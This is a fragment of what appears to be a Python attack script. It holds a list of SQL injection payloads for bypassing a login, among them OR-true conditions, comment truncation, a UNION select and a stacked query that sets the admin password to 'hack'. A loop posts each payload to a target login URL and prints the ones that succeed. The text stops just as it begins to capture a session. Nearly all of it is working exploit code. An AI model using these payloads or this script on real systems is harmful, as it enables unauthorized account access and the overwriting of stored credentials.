    # Standard OR-based bypass
    "' OR '1'='1'-- -",
    # Comment out rest of query
    "admin'-- -",
    # Using # comment (MySQL)
    "admin'#",
    # Using OR with true condition
    "' OR 1=1-- -",
    # Using LIKE
    "admin' OR '1'='1",
    # Using UNION
    "' UNION SELECT 'admin','password'-- -",
    # Using stacked queries
    "'; UPDATE users SET password='hack' WHERE username='admin';-- -",
    # Using TRUE boolean
    "admin' OR TRUE-- -",
    # Using 1=1 in different forms
    "admin' OR 1-- -",
    "admin' OR 'x'='x'-- -",
    # Bypass with multiple ORs
    "' OR username='admin'-- -",
]

print("[*] Testing authentication bypass payloads:")
for payload in bypass_payloads:
    data = {
        "username": payload,
        "password": "anything",
        "submit": "submit"
    }
    response = requests.post(TARGET_URL, data=data)
    
    if '"Success"' in response.text:
        print(f"[+] SUCCESS with payload: {payload}")
        # Try to get session
